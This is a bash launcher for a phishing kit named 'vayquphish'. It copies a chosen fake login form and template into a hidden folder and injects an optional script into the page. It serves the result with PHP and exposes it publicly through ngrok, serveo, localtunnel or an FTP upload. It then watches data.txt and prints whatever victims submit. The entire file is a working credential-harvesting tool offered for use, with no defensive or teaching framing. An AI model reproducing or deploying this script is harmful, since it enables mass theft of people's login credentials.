#!/bin/bash
quit() {
	rm -r .data
    exit
}

trap quit SIGINT
trap quit SIGTERM
syan='\033[0;31m'
green='\033[1;32m'
greens='\033[0;32m'
reset='\033[0m'
echo -e "${greens}//............................................................................................................................................................
//.....................................................................................................hhhhh............iiiii.................hhhhh...........
//.....................................................................................................hhhhh............iiiii.................hhhhh...........
//.....................................................................................................hhhhh............iiiii.................hhhhh...........
//.....................................................................................................hhhhh............iiiii.................hhhhh...........
//.vvvvv......vvvvv...aaaaaaaa....ayyyy......yyyyy....qqqqq.qqqqqq..uuuuuu...uuuuuu...ppppp.ppppp......hhhhh.hhhhh......iiiii.....sssssss.....hhhhh.hhhhh.....
//.vvvvv.....vvvvvv..aaaaaaaaaaa..ayyyy.....yyyyyy...qqqqqqqqqqqqq..uuuuuu...uuuuuu...pppppppppppp.....hhhhhhhhhhhh.....iiiii...sssssssssss...hhhhhhhhhhhh....
//.vvvvvv....vvvvv...aaaaaaaaaaaa.ayyyyy....yyyyy...qqqqqqqqqqqqqq..uuuuuu...uuuuuu...ppppppppppppp....hhhhhhhhhhhhh....iiiii..ssssssssssss...hhhhhhhhhhhhh...
//..vvvvv....vvvvv...aaaaaaaaaaaa..yyyyy....yyyyy..qqqqqqqqqqqqqqq..uuuuuu...uuuuuu...pppppppppppppp...hhhhhhhhhhhhh....iiiii..ssssssssssss...hhhhhhhhhhhhh...
//..vvvvv...vvvvvv...a......aaaaaa.yyyyyy..yyyyy...qqqqqq..qqqqqqq..uuuuuu...uuuuuu...pppppp..pppppp...hhhhhh..hhhhhh...iiiii..sssss.....ss...hhhhhh..hhhhhh..
//...vvvvv..vvvvv......aaaaaaaaaaa..yyyyy..yyyyy...qqqqq....qqqqqq..uuuuuu...uuuuuu...ppppp....ppppp...hhhhh...hhhhhh...iiiii..ssssssss.......hhhhh...hhhhhh..
//...vvvvv.vvvvvv....aaaaaaaaaaaaa..yyyyy..yyyyy...qqqqq....qqqqqq..uuuuuu...uuuuuu...ppppp....pppppp..hhhhh...hhhhhh...iiiii..sssssssssss....hhhhh...hhhhhh..
//...vvvvvvvvvvv....aaaaaaaaaaaaaa..yyyyyyyyyyy....qqqqq....qqqqqq..uuuuuu...uuuuuu...ppppp....pppppp..hhhhh...hhhhhh...iiiii..ssssssssssss...hhhhh...hhhhhh..
//....vvvvvvvvvv....aaaaaaaaaaaaaa...yyyyyyyyyy....qqqqq....qqqqqq..uuuuuu...uuuuuu...ppppp....pppppp..hhhhh....hhhhh...iiiii....ssssssssss...hhhhh....hhhhh..
//....vvvvvvvvvv....aaaaa...aaaaaa...yyyyyyyyyy....qqqqq....qqqqqq..uuuuuu...uuuuuu...ppppp....ppppp...hhhhh....hhhhh...iiiii........sssssss..hhhhh....hhhhh..
//....vvvvvvvvv.....aaaaa..aaaaaaa....yyyyyyyy.....qqqqqq..qqqqqqq..uuuuuuuuuuuuuuu...pppppp..pppppp...hhhhh....hhhhh...iiiii..sss....ssssss..hhhhh....hhhhh..
//.....vvvvvvvv.....aaaaaaaaaaaaaa....yyyyyyyy.....qqqqqqqqqqqqqqq...uuuuuuuuuuuuuu...pppppppppppppp...hhhhh....hhhhh...iiiii..sssssssssssss..hhhhh....hhhhh..
//.....vvvvvvv......aaaaaaaaaaaaaa.....yyyyyy.......qqqqqqqqqqqqqq...uuuuuuuuuuuuuu...ppppppppppppp....hhhhh....hhhhh...iiiii..ssssssssssss...hhhhh....hhhhh..
//......vvvvvv.......aaaaaaaaaaaaa.....yyyyyy........qqqqqqqqqqqqq....uuuuuuuuuuuuu...pppppppppppp.....hhhhh....hhhhh...iiiii..sssssssssss....hhhhh....hhhhh..
//....................aaaaa............yyyyyy.........qqqqq.qqqqqq.....uuuuu..........ppppp.ppppp................................sssssss......................
//.....................................yyyyy................qqqqqq....................ppppp...................................................................
//..................................yyyyyyyy................qqqqqq....................ppppp...................................................................
//..................................yyyyyyy.................qqqqqq....................ppppp...................................................................
//..................................yyyyyy..................qqqqqq....................ppppp...................................................................
//..................................yyyy......................................................................................................................
//............................................................................................................................................................${reset}"
mkdir .data

echo -e "Please open ./install.sh if u need to install depenses"
echo -e "${syan}please enter phishing form's directory\n${reset}"
ls -1 ./sites/forms
echo -en "${reset}>\e "
read phishname
if  [ ! -d "./sites/forms/$phishname" ] || [ -z "$phishname" ] ; then
	 echo -e "${syan}$phishname not exist or is empty${reset}"
 exit
fi 
echo -e "${syan}please enter phishing temp directory or hit 0\n${reset}"
ls -1 ./sites/temps 
echo -en "${reset}>\e " 
read tempname
if [ ! -d "./sites/temps/$tempname" ] && [ $tempname != "0" ] || [ -z "$tempname" ] ; then
	 echo -e "${syan}$tempname is empty or not exist${reset}"
 	 exit
fi 
echo -e "${syan}please enter additional script or hit 0\n${reset}"
ls -1 ./scripts
echo -en "${reset}>\e " 
read scriptname
if [ ! -z "$scriptname" ] || [ ! -d "./scripts/$scriptname" ]; then
	if [ $scriptname != "0" ] && [ $tempname != "0" ]   ; then
       		echo -e "${syan}whare to add script\n${reset}"
			echo -e "${green}[1]temp\n"
			echo -e "${green}[2]form\n"
			echo -en "${reset}>\e " 
			read ascript
			 if [ -z "$ascript" ] ; then
				echo -e "${syan}Invalid argument${reset}"
 				exit
			fi
		else 
			ascript="2"
	fi
else
	echo -e "${syan}Invalid argument${reset}"
 	exit
fi

echo -e "${syan}please enter the number of method for tunnelling\n"
echo -e "${green}[1]localhost\n"
echo -e "${green}[2]ngrok\n"
echo -e "${green}[3]serveo\n"
echo -e "${green}[4]localtunnel\n"
echo -e "${green}[5]ftp\n"
echo -en "${reset}>\e " 
read methodname
if [ -z "$methodname" ] ; then
	echo -e "${syan}Invalid argument${reset}"
 	exit
fi
if [ $methodname = "1" ] ; then
	echo -e "${green}please enter your listening port number(more than 1300 recommended)\n"
	echo -en "${reset}>\e " 
	read listenport
	if [ -z "$listenport" ] || [ $listenport = "0" ] ; then
		echo -e "${syan}Invalid argument${reset}"
 	    exit
	fi
	if [ $listenport -lt 1220 ] ; then
		if [ "$EUID" -ne 0 ] ; then
		echo -e "${reset}Please run as root if u want to use port $listenport"
		exit
		fi 
	fi
fi
if [ $methodname = "3" ] ; then
	echo -e "${green}please enter serveo subdomain\n"
	echo -en "${reset}>\e " 
	read subdomain
	if [ -z "$subdomain" ] || [ $subdomain = "0" ] ; then
		echo -e "${syan}Invalid argument${reset}"
 	    exit
	fi
fi
if [ $methodname = "4" ] ; then
	echo -e "${green}please enter localtunnel subdomain\n"
	echo -en "${reset}>\e " 
	read subdomain
	if [ -z "$subdomain" ] || [ $subdomain = "0" ] ; then
		echo -e "${syan}Invalid argument${reset}"
 	    exit
	fi
fi
if [ $methodname = "5" ] ; then
	echo -e "${green}please enter ftp domain\n"
	echo -en "${reset}>\e " 
	read domain
	if [ -z "$domain" ] || [ $domain = "0" ] ; then
		echo -e "${syan}Invalid argument${reset}"
 	    exit
	fi
	echo -e "${green}please enter ftp login\n"
	echo -en "${reset}>\e " 
	read login
	if [ -z "$login" ]; then
		echo -e "${syan}Invalid argument${reset}"
 	    exit
	fi
	echo -e "${green}please enter ftp password\n"
	echo -en "${reset}>\e " 
	read password
	echo -e "${green}please enter working directory\n"
	echo -en "${reset}>\e " 
	read direct
fi
echo -e "${greens}vayquphish is starting\n"
echo -e "${greens}copying $phishname to destination folder${reset}\n"
cp -R -i -v "./sites/forms/$phishname/"* ./.data
 if [ $tempname != "0"  ] ; then
		echo -e "${greens}copying $tempname to destination folder${reset}\n"
		cp -R -i -v "./sites/temps/$tempname/"* "./.data/"
fi
if [ $scriptname != "0" ]; then
	echo -e "${greens}reading $scriptname${reset}\n"
	van=$(<"./scripts/$scriptname/script")
	echo -e "${greens}inserting $scriptname to file${reset}\n"
	if [ $ascript = "1" ]; then
		k="sed -i '/\<head\>/a $van' ./.data/index.html"
	fi
	if [ $ascript = "2"  ]; then
		k="sed -i '/\<head\>/a $van' ./.data/login.php"
	fi
	echo -e "${greens}copying $scriptname php file${reset}\n"
	cp -R -i -v "./scripts/$scriptname/write.php" "./.data/"
	eval $k;
fi
if [ $methodname = "1" ]; then
	echo -e "${greens}starting php server to localhost${reset}\n"
	if [ $tempname = "0" ]; then
		echo -e "${greens}renaming login.php file${reset}\n"
		mv -i ./.data/login.php ./.data/index.php
    fi
    if [ "$EUID" -ne 0 ] ; then
		php -S "127.0.0.1:$listenport" -t ./.data/ > /dev/null &
	else
		sudo php -S "127.0.0.1:$listenport" -t ./.data/ > /dev/null &
	fi
	echo -e "${greens}starting php server in 127.0.0.1:$listenport${reset}\n"
fi
if [ $methodname = "2" ]; then
	echo -e "${greens}starting php server in 127.0.0.1:3445${reset}\n"
	if [ $tempname = "0" ]; then
		echo -e "${greens}renaming login.php file${reset}\n"
		mv -i ./.data/login.php ./.data/index.php
    fi
	php -S "127.0.0.1:3445" -t ./.data/ > /dev/null &
	echo -e "${greens}starting ngrok server${reset}\n"
	./bin/ngrok http 3445 > /dev/null &
	curl http://127.0.0.1:4040/api/tunnels > ./.data/tunnels.json 
	data=$(<"./.data/tunnels.json")
	cat ./.data/tunnels.json | jq '[.tunnels[].public_url]'
fi
if [ $methodname = "3" ]; then
	echo -e "${greens}starting php server in 127.0.0.1:3445${reset}\n"
	if [ $tempname = "0" ]; then
		echo -e "${greens}renaming login.php file${reset}\n"
		mv -i ./.data/login.php ./.data/index.php
	fi
	php -S "127.0.0.1:3445" -t ./.data/ > /dev/null &
	echo -e "${greens}connecting with ssh${reset}\n"
	ssh -R "$subdomain.serveo.net:80:localhost:3445" serveo.net &
fi
if [ $methodname = "4" ]; then
	echo -e "${greens}starting php server in 127.0.0.1:3445${reset}\n"
	if [ $tempname = "0" ]; then
		echo -e "${greens}renaming login.php file${reset}\n"
		mv -i ./.data/login.php ./.data/index.php
	fi
	php -S "127.0.0.1:3445" -t ./.data/ > /dev/null &
	echo -e "${greens}connecting with localtunnel${reset}\n"
	lt --port 3445 --subdomain "$subdomain"
fi
if [ $methodname = "5" ]; then
	echo -e "${greens}connecting to ftp server $domain${reset}\n"
	if [ $tempname = "0" ]; then
		echo -e "${greens}renaming login.php file${reset}\n"
		mv -i ./.data/login.php ./.data/index.php
	fi
	echo -e "${greens}ftp upload${reset}\n"
	ncftpput -R -v -u "$login" -p "$password" "$domain" "$direct" ./.data/*
	echo -e "${greens}ftp done !!!${reset}\n"
	exit 0
fi
m1=$(md5sum "./.data/data.txt")
while true; do
	m2=$(md5sum "./.data/data.txt")
	if [ "$m1" != "$m2" ] ; then
	cat ./.data/data.txt
	m1=$(md5sum "./.data/data.txt")
	fi
done